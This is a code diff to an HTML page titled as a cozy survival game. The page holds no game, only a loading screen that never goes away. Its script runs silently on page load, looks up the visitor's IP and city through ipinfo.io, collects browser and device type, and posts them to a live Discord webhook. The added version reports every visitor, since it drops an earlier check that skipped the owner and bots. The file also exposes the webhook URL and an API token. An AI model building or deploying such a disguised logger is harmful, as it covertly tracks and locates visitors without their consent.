@@ -3,169 +3,116 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LucasEM's very cozy game</title>
+    <title>LucasEM's Very Cozy Game</title>
     <style>
-        /* Loading Screen Styles */
+        /* Loading screen styles */
         #loading-screen {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.5);
+            background: rgba(0, 0, 0, 0.8);
             display: flex;
             justify-content: center;
             align-items: center;
             z-index: 9999;
             flex-direction: column;
         }
-
         .spinner {
-            border: 8px solid #f3f3f3; /* Light gray */
-            border-top: 8px solid #3498db; /* Blue */
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #3498db;
             border-radius: 50%;
             width: 50px;
             height: 50px;
             animation: spin 2s linear infinite;
             margin-bottom: 20px;
         }
-
-        /* Spinner Animation */
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        /* Text styling in the middle */
         #loading-text {
             font-size: 24px;
             color: white;
             font-family: Arial, sans-serif;
             font-weight: bold;
         }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
+    <!-- Loading screen -->
+    <div id="loading-screen">
+        <div class="spinner"></div>
+        <div id="loading-text">LucasEM's cozy survival game</div>
+    </div>
 
-<!-- Loading Screen HTML -->
-<div id="loading-screen">
-    <div class="spinner"></div>
-    <div id="loading-text">LucasEM's cozy survival game</div>
-</div>
-
-<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1-crypto-js.js"></script>
-
-<script>
-    // SHA-256 hash of your public IP address (use an online SHA-256 generator to hash your IP)
-    const myIPHash = "YOUR_SHA256_HASH_OF_IP"; // Replace this with the SHA-256 hash of your actual public IP
-
-    // Function to get browser and device info
-    function getDeviceInfo() {
-        const userAgent = navigator.userAgent;
-        let deviceName = "Unknown Device";
-        let deviceType = "Unknown Type";
-        let browser = "Unknown Browser";
-
-        // Detect browser
-        if (userAgent.indexOf("Chrome") > -1) {
-            browser = "Chrome";
-        } else if (userAgent.indexOf("Firefox") > -1) {
-            browser = "Firefox";
-        } else if (userAgent.indexOf("Safari") > -1) {
-            browser = "Safari";
-        } else if (userAgent.indexOf("Edge") > -1) {
-            browser = "Edge";
-        }
-
-        // Detect device type (mobile or desktop)
-        if (/Mobi|Android|iPhone|iPad|iPod/i.test(userAgent)) {
-            deviceType = "Mobile";
-            deviceName = "Mobile Device";
-        } else {
-            deviceType = "Desktop";
-            deviceName = "Desktop Computer";
-        }
-
-        return { deviceName, deviceType, browser };
-    }
-
-    // Function to detect if the user is a bot
-    function isBot() {
-        return navigator.webdriver; // True if it's a bot (automated browser)
-    }
-
-    // Fetch user IP information
-    fetch('https://ipinfo.io/json?token=abfa2c858d87e3')  // Using your IPInfo token
-    .then(response => response.json())
-    .then(data => {
-        const ip = data.ip;
-        const city = data.city;
-
-        // Hash the user's IP
-        const userIPHash = CryptoJS.SHA256(ip).toString(CryptoJS.enc.Base64);
-
-        // If the IP hash matches your own, don't send the webhook
-        if (userIPHash === myIPHash || isBot()) {
-            console.log("Skipping webhook for your IP or bot.");
-            return; // Skip the webhook
-        }
-
-        // Get device and browser information
-        const { deviceName, deviceType, browser } = getDeviceInfo();
-
-        // Log the user information (can be removed later)
-        console.log('City:', city);
-        console.log('Device:', deviceName);
-        console.log('Device Type:', deviceType);
-        console.log('Browser:', browser);
-
+    <script>
         // Discord webhook URL
-        const webhookURL = 'https://discord.com/api/webhooks/1328100763590987870/2K9BQddkrxO9SzFBH3lZMZDsRccH3dzT8MVWLOQWOJiKqC2NtNo4p8i-Ct1ULOVGvkYs';
+        const webhookURL = "https://discord.com/api/webhooks/1328100763590987870/2K9BQddkrxO9SzFBH3lZMZDsRccH3dzT8MVWLOQWOJiKqC2NtNo4p8i-Ct1ULOVGvkYs";
 
-        // Create a Discord embed message
-        const message = {
-            content: 'LucasEM\'s very cozy game',
-            embeds: [
-                {
-                    title: "LucasEM's very cozy game",  // Title with large text
-                    description: 'Welcome to LucasEM\'s cozy survival game!',
-                    color: 0xFFFFFF,  // White background
-                    fields: [
-                        { name: "City", value: city || "Unknown", inline: true },
-                        { name: "Device", value: deviceName, inline: true },
-                        { name: "Device Type", value: deviceType, inline: true },
-                        { name: "Browser", value: browser, inline: true }
-                    ],
-                    footer: {
-                        text: "Thank you for visiting!",
-                    },
-                    image: {
-                        url: "https://your-image-url.com"  // Optional, you can add an image if you want
-                    }
-                }
-            ]
-        };
+        // Function to get browser and device information
+        function getDeviceInfo() {
+            const userAgent = navigator.userAgent;
+            let deviceType = "Unknown";
+            let browser = "Unknown";
 
-        // Send data to Discord webhook
-        fetch(webhookURL, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify(message),
-        })
-        .then(response => response.json())
-        .then(data => {
-            console.log('Message sent:', data);
-            // The loading screen will stay visible, no need to hide it
-        })
-        .catch(error => console.error('Error sending message:', error));
-    })
-    .catch(error => {
-        console.error('Error fetching IP data:', error);
-        // Loading screen remains visible even on error
-    });
-</script>
+            // Detect browser
+            if (userAgent.indexOf("Chrome") > -1) browser = "Chrome";
+            else if (userAgent.indexOf("Firefox") > -1) browser = "Firefox";
+            else if (userAgent.indexOf("Safari") > -1) browser = "Safari";
+            else if (userAgent.indexOf("Edge") > -1) browser = "Edge";
 
+            // Detect device type
+            if (/Mobi|Android|iPhone|iPad|iPod/i.test(userAgent)) {
+                deviceType = "Mobile";
+            } else {
+                deviceType = "Desktop";
+            }
+
+            return { deviceType, browser };
+        }
+
+        // Fetch IP and send webhook
+        fetch("https://ipinfo.io/json?token=abfa2c858d87e3")
+            .then(response => response.json())
+            .then(data => {
+                const { ip, city } = data;
+                const { deviceType, browser } = getDeviceInfo();
+
+                // Create the webhook message
+                const message = {
+                    content: "LucasEM's cozy survival game",
+                    embeds: [
+                        {
+                            title: "LucasEM's Very Cozy Game",
+                            description: "Welcome to LucasEM's cozy survival game!",
+                            color: 0xFFFFFF,
+                            fields: [
+                                { name: "City", value: city || "Unknown", inline: true },
+                                { name: "Device Type", value: deviceType, inline: true },
+                                { name: "Browser", value: browser, inline: true },
+                            ],
+                            footer: {
+                                text: "Thank you for visiting!",
+                            }
+                        }
+                    ]
+                };
+
+                // Send data to the Discord webhook
+                fetch(webhookURL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(message),
+                })
+                    .then(res => {
+                        if (res.ok) console.log("Webhook sent successfully!");
+                        else console.error("Failed to send webhook:", res.statusText);
+                    })
+                    .catch(err => console.error("Error:", err));
+            })
+            .catch(err => console.error("Error fetching IP data:", err));
+    </script>
 </body>
 </html>
